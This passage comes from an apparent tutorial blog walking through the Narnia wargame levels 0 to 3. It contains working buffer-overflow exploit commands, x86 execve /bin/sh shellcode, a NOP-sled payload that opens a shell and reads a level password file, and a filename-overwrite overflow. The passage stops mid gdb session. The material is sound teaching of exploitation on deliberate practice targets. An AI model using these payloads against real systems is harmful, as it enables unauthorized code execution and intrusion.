</span><span class='line'>08049798 R_386_JUMP_SLOT   __libc_start_main</span></code></pre></td></tr></table></div></figure>

Quick diagram what it looks like:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>So a quick diagram of what happens looks kind'a like this:
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  [printf()] &lt;--------------------------------
</span><span class='line'>     |                                       |
</span><span class='line'>     --------------&gt; [PLT]---&gt;[d_r_resolve]--|
</span><span class='line'>                             |           |         |
</span><span class='line'>                       --------------------&gt;[GOT]&lt;--
</span><span class='line'>                                   |               |
</span><span class='line'>                                   -------&gt;[libc]--</span></code></pre></td></tr></table></div></figure>
</li>
<li>A good paper to read about and from where the definition and diagram is taken is <a href="http://www.exploit-db.com/papers/13203/">How to Hijack the Global Offset Table with pointers</a></li>
</ul>
</li>

</ul>
</li>
</ol>


<h3>Buffer Overflow Examples</h3>

<ol>
<li>
Let&#8217;s see a simple example of binary exploitation <strong>Narnia0</strong> where we have to write a written value.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 &#8220;A&#8221; and the address it won&#8217;t work as the val doesn&#8217;t matches. So, we have to use python print command.
If we use 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
</li>


<li>In another example below <strong>Narnia1</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="nb">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="n">NULL</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
We need to set a environment variable EGG with an shellcode. Previously, I tried with
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\b</span><span class="s">in\sh&quot;</span>
</span><span class='line'><span class="ow">and</span>
</span><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>
Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that
if I write
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\xCC&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
It should sigtrap. &#8220;\xCC&#8221; acts as a software breakpoint, basically an INT3,  It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you&#8217;re good to go, and it&#8217;s a good way to make sure you&#8217;ve properly redirected execution to your shellcode. You can further put &#8220;\xCC&#8221; anywhere in the shellcode, if it crashes before &#8220;\xCC&#8221;, you know for sure that your shellcode has bad characters.
They suggested to export the EGG variable as
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
and it worked like a charm.
</li>

<li>
In another example <strong>Narnia2</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'>  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
It&#8217;s to easy that buffer overflow vulnerability exists because of strcpy. Let&#8217;s see what is the offset for this.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ulimit -c unlimited
</span><span class='line'>./narnia2 `/usr/share/metasploit-framework/tools/pattern_create.rb 200`
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>
</span><span class='line'>gdb -q -c core ./narnia2
</span><span class='line'>#0  0x37654136 in ?? ()
</span><span class='line'>
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140
</span><span class='line'>narnia2@melinda:~$ gdb -q /narnia/narnia2
</span><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>**Snip**
</span><span class='line'>   0x080484a0 &lt;+67&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484a3 &lt;+70&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
</span><span class='line'>**Snip**
</span><span class='line'>End of assembler dump.
</span><span class='line'>(gdb) br *main+70
</span><span class='line'>Breakpoint 1 at 0x80484a3
</span><span class='line'>(gdb) run `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>Starting program: /games/narnia/narnia2 `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a3 in main ()
</span><span class='line'>(gdb) n
</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see the stack after the strcpy, which would tell us the probable address we want to redirect execution.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/80xw $esp+400
</span><span class='line'>0xffffd7e0:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f0:   0x00000000  0x00000000  0x1d000000  0xa9c79d1b
</span><span class='line'>0xffffd800:   0xe1a67367  0xc19fc850  0x6996cde4  0x00363836
</span><span class='line'>0xffffd810:   0x2f000000  0x656d6167  0x616e2f73  0x61696e72
</span><span class='line'>0xffffd820:   0x72616e2f  0x3261696e  0x41414100  0x41414141
</span><span class='line'>0xffffd830:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd840:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd850:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd860:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd870:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd880:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd890:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x41414141  0x42424241  0x44580042  0x45535f47
</span><span class='line'>0xffffd8c0:   0x4f495353  0x44495f4e  0x3939383d  0x53003733</span></code></pre></td></tr></table></div></figure>
Let pick a shellcode from shellstorm for a Linux x86 execuve /bin/sh and calculate the number of NOPs
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:~$ python -c 'print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'
</span><span class='line'>23
</span><span class='line'>narnia2@melinda:~$ bc    
</span><span class='line'>140-23
</span><span class='line'>117
</span><span class='line'>narnia2@melinda:~$ /narnia/narnia2 `python -c 'print "\x90"*117 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia3
</span><span class='line'>**********
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>


<li>
In another example <strong>Narnia3</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt; </span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>        <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* open files */</span>
</span><span class='line'>        <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* copy from file1 to file2 */</span>
</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* close &#39;em */</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Superkojiman notes explain this best, copied here with permission, thanks superkojiman :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia3@melissa:/narnia$ ./narnia3 /etc/motd
</span><span class='line'>copied contents of /etc/motd to a safer place... (/dev/null)</span></code></pre></td></tr></table></div></figure>
We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. 

We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here&#8217;s what the stack looks like:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+---------+
</span><span class='line'>|  ret    |
</span><span class='line'>|  sfp    |
</span><span class='line'>|  ofd    |
</span><span class='line'>|  ifd    |
</span><span class='line'>|  ofile  |
</span><span class='line'>|  ifile  |
</span><span class='line'>|  buf    |
</span><span class='line'>+---------+ &lt;- esp</span></code></pre></td></tr></table></div></figure>
ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3
</span><span class='line'># gdb -q narnia3
</span><span class='line'>
</span><span class='line'>If we disas main, we can see that strcpy is called at *main+100:
</span><span class='line'>
</span><span class='line'>   0x08048551 &lt;+93&gt;:    lea    0x38(%esp),%eax
</span><span class='line'>   0x08048555 &lt;+97&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x08048558 &lt;+100&gt;:   call   0x8048400 &lt;strcpy@plt&gt;
</span><span class='line'>   0x0804855d &lt;+105&gt;:   movl   $0x2,0x4(%esp)
</span><span class='line'>   0x08048565 &lt;+113&gt;:   lea    0x58(%esp),%eax
</span><span class='line'>   0x08048569 &lt;+117&gt;:   mov    %eax,(%esp)
</span><span class='line'>
</span><span class='line'>We set a breakpoint there and run the program with the following arguments:
</span><span class='line'>
</span><span class='line'>(gdb) r `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>Starting program: /root/wargames/narnia/3/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
</span><span class='line'>37            strcpy(ifile, argv[1]);
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>At the first breakpoint, we examine the local variables
</span><span class='line'>
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/dev/null\000\000\000\000\000\000"
</span><span class='line'>ifile = "x\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b$\243\374\267\364\237", &lt;incomplete sequence \374\267&gt;
</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>ofile is set to /dev/null as expected. We'll step to the next instruction and check again.
</span><span class='line'>
</span><span class='line'>(gdb) s
</span><span class='line'>38            if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/tmp/hack\000\000\000\000\000\000"
</span><span class='line'>ifile = 'A' &lt;repeats 32 times&gt;
